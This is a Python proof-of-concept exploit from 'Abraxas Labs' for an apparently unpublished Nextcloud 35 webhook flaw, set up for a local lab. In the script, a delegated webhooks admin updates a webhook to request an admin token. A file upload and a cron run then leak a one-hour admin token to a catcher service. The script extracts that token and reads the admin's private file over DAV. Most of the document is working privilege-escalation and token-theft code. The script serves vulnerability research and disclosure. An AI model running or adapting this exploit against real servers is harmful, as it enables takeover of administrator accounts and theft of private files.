#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: nextcloud-webhook-tokenneeded (High: 8.8)
#  Vendor: Nextcloud GmbH
#  Versions: Nextcloud Server 35.0.0
#  Impact: Delegated Webhooks admin -> 1h admin app password / DAV
#  Requires: delegated Webhooks settings admin, POST /ocs/v2.php/apps/webhook_listeners/api/v1/webhooks/{id}
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "nextcloud-webhook-tokenneeded"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Local oracle for unpublished Nextcloud webhook update tokenNeeded.

Delegated Webhooks admin (not instance admin) creates a webhook (create strips
tokenNeeded) then updates the same id with tokenNeeded.user_ids=["admin"].
NodeCreatedEvent + cron mints a 1h admin PERMANENT_TOKEN posted to the catcher.
Unauth Bearer DAV reads the admin private witness file.

Loopback only. No shells. No ExApp path.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = os.environ.get("NC_URL", "http://127.0.0.1:18320").rstrip("/")
HOOK = os.environ.get("HOOK_URL", "http://127.0.0.1:18321").rstrip("/")
ADMIN = os.environ.get("NC_ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("NC_ADMIN_PASSWORD", "LabAdmin35!")
HOOKER = os.environ.get("NC_HOOKER_USER", "hooker")
HOOKER_PASS = os.environ.get("NC_HOOKER_PASSWORD", "LabHooker35!")
WITNESS = "NEXTCLOUD-WEBHOOK-TOKENNEEDED-WITNESS"
EVENT = r"OCP\Files\Events\Node\NodeCreatedEvent"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "nextcloud-webhook-tokenneeded")


def fail(msg: str) -> None:
    print(f"FAIL NEXTCLOUD-WEBHOOK-TOKENNEEDED {msg}", flush=True)
    raise SystemExit(1)


def basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 60.0,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": "nextcloud-webhook-tokenneeded-lab"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        fail(f"http {method} {url} error {exc}")


def ocs(method: str, path: str, user: str, password: str, payload: dict | None = None) -> tuple[int, dict]:
    body = None if payload is None else json.dumps(payload).encode()
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    if payload is not None:
        hdrs["Content-Type"] = "application/json"
    sep = "&" if "?" in path else "?"
    url = BASE + path + sep + "format=json"
    code, _, raw = http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        fail(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed


def ocs_data(parsed: dict) -> dict | list | None:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def ocs_meta(parsed: dict) -> dict:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def token_needed_uids(obj: object) -> list[str]:
    if not isinstance(obj, dict):
        return []
    tn = obj.get("tokenNeeded")
    if tn is None:
        tn = obj.get("token_needed")
    if isinstance(tn, str):
        try:
            tn = json.loads(tn)
        except json.JSONDecodeError:
            return []
    if not isinstance(tn, dict):
        return []
    uids = tn.get("user_ids") or tn.get("userIds") or []
    if isinstance(uids, list):
        return [str(x) for x in uids]
    return []


def webhook_body() -> dict:
    return {
        "httpMethod": "POST",
        "uri": "http://hook:8080/hook",
        "event": EVENT,
        "eventFilter": {},
        "userIdFilter": "",
        "headers": {},
        "authMethod": "none",
        "authData": {},
        "tokenNeeded": {"user_ids": [ADMIN]},
    }


def compose_exec(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", *args],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def run_cron() -> None:
    proc = compose_exec("-u", "www-data", "nextcloud", "php", "-f", "/var/www/html/cron.php", timeout=180)
    print(
        f"IOC cron rc={proc.returncode} stdout={proc.stdout.strip()[:200]!r} stderr={proc.stderr.strip()[:200]!r}",
        flush=True,
    )


def fetch_catcher() -> dict:
    code, _, raw = http("GET", HOOK + "/last", timeout=10)
    text = raw.decode("utf-8", "replace")
    print(f"IOC catcher http={code} bytes={len(raw)}", flush=True)
    if not text.strip() or text.strip() == "{}":
        return {}
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        fail(f"catcher not json body={text[:400]!r}")
    if not isinstance(parsed, dict):
        fail(f"catcher json not object type={type(parsed).__name__}")
    return parsed


def extract_admin_token(payload: dict) -> str:
    auth = payload.get("authentication")
    if not isinstance(auth, dict) or not auth:
        fail("empty authentication")
    print(f"IOC authentication-keys={list(auth.keys())}", flush=True)
    user_ids = auth.get("user_ids")
    if not isinstance(user_ids, dict):
        fail(f"authentication.user_ids missing keys={list(auth.keys())}")
    admin_blob = user_ids.get(ADMIN)
    if not isinstance(admin_blob, dict):
        fail(f"authentication.user_ids.{ADMIN} missing have={list(user_ids.keys())}")
    token = admin_blob.get("token")
    uid = admin_blob.get("userId") or admin_blob.get("user_id")
    print(f"IOC stolen-token uid={uid!r} token_len={len(str(token or ''))}", flush=True)
    if not token:
        fail("authentication.user_ids.admin.token missing")
    if uid and str(uid) != ADMIN:
        fail(f"stolen token uid={uid!r} expected={ADMIN!r}")
    return str(token)


def main() -> None:
    print(f"IOC base={BASE} hook={HOOK} actor={HOOKER} target_uid={ADMIN}", flush=True)

    code, parsed = ocs("GET", "/ocs/v2.php/cloud/users/" + HOOKER, HOOKER, HOOKER_PASS)
    groups = []
    data = ocs_data(parsed)
    if isinstance(data, dict):
        groups = data.get("groups") or []
        if isinstance(groups, dict):
            groups = list(groups.values()) if not groups.get("element") else groups.get("element")
        if isinstance(data.get("groups"), dict) and "element" in data["groups"]:
            el = data["groups"]["element"]
            groups = el if isinstance(el, list) else [el]
    print(f"IOC hooker-login http={code} groups={groups}", flush=True)
    if code not in (200, 201):
        fail(f"hooker login/info http={code} meta={ocs_meta(parsed)}")
    if ADMIN in [str(g) for g in groups]:
        fail("hooker is in admin group (wrong fixture)")

    body = webhook_body()
    code, parsed = ocs(
        "POST",
        "/ocs/v2.php/apps/webhook_listeners/api/v1/webhooks",
        HOOKER,
        HOOKER_PASS,
        body,
    )
    data = ocs_data(parsed)
    print(f"IOC create http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:800]}", flush=True)
    if code not in (200, 201) or not isinstance(data, dict):
        fail(f"create webhook http={code} meta={ocs_meta(parsed)}")
    webhook_id = data.get("id")
    if webhook_id is None:
        fail("create webhook missing id")
    create_uids = token_needed_uids(data)
    if ADMIN in create_uids:
        print("IOC create-tokenNeeded-not-stripped uids=" + ",".join(create_uids), flush=True)
    else:
        print(f"IOC create-stripped tokenNeeded={data.get('tokenNeeded')!r}", flush=True)

    code, parsed = ocs(
        "POST",
        f"/ocs/v2.php/apps/webhook_listeners/api/v1/webhooks/{webhook_id}",
        HOOKER,
        HOOKER_PASS,
        body,
    )
    data = ocs_data(parsed)
    print(f"IOC update http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:800]}", flush=True)
    if code == 403:
        fail("update 403")
    if code not in (200, 201):
        fail(f"update webhook http={code} meta={ocs_meta(parsed)}")

    code, parsed = ocs(
        "GET",
        f"/ocs/v2.php/apps/webhook_listeners/api/v1/webhooks/{webhook_id}",
        HOOKER,
        HOOKER_PASS,
    )
    data = ocs_data(parsed)
    print(f"IOC get http={code} data={json.dumps(data)[:800]}", flush=True)
    if not isinstance(data, dict):
        fail(f"get webhook http={code} meta={ocs_meta(parsed)}")
    stored_uids = token_needed_uids(data)
    print(f"IOC stored-tokenNeeded-uids={stored_uids}", flush=True)
    if ADMIN not in stored_uids:
        fail("tokenNeeded stripped on update")

    trigger_name = f"trigger-{int(time.time())}.txt"
    trigger_path = f"/remote.php/dav/files/{HOOKER}/{trigger_name}"
    put_code, _, put_body = http(
        "PUT",
        BASE + trigger_path,
        data=b"trigger-node-created",
        headers={
            "Authorization": basic(HOOKER, HOOKER_PASS),
            "Content-Type": "text/plain",
        },
    )
    print(f"IOC trigger-put http={put_code} path={trigger_path} body={put_body[:120]!r}", flush=True)
    if put_code not in (200, 201, 204):
        fail(f"trigger PUT http={put_code} body={put_body[:300]!r}")

    payload: dict = {}
    for i in range(8):
        run_cron()
        payload = fetch_catcher()
        auth = payload.get("authentication") if isinstance(payload, dict) else None
        if isinstance(auth, dict) and auth:
            print(f"IOC catcher-ready attempt={i}", flush=True)
            break
        print(f"IOC catcher-wait attempt={i} keys={list(payload.keys()) if payload else []}", flush=True)
        time.sleep(2)
    else:
        fail("catcher empty after cron")

    if not payload.get("authentication"):
        fail("empty authentication")

    token = extract_admin_token(payload)

    dav_path = f"/remote.php/dav/files/{ADMIN}/{WITNESS}.txt"
    dav_code, dav_hdrs, dav_body = http(
        "GET",
        BASE + dav_path,
        headers={"Authorization": f"Bearer {token}"},
    )
    text = dav_body.decode("utf-8", "replace")
    xuid = dav_hdrs.get("x-user-id", "")
    print(
        f"IOC dav-bearer http={dav_code} x-user-id={xuid!r} body={text[:200]!r}",
        flush=True,
    )
    if dav_code != 200:
        fail(f"dav bearer http={dav_code} body={text[:300]!r}")
    if WITNESS not in text:
        fail(f"dav body missing witness got={text[:200]!r}")

    print(
        f"SUCCESS NEXTCLOUD-WEBHOOK-TOKENNEEDED who=delegated-webhook-admin uid={ADMIN} {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"unhandled {type(exc).__name__}: {exc}")

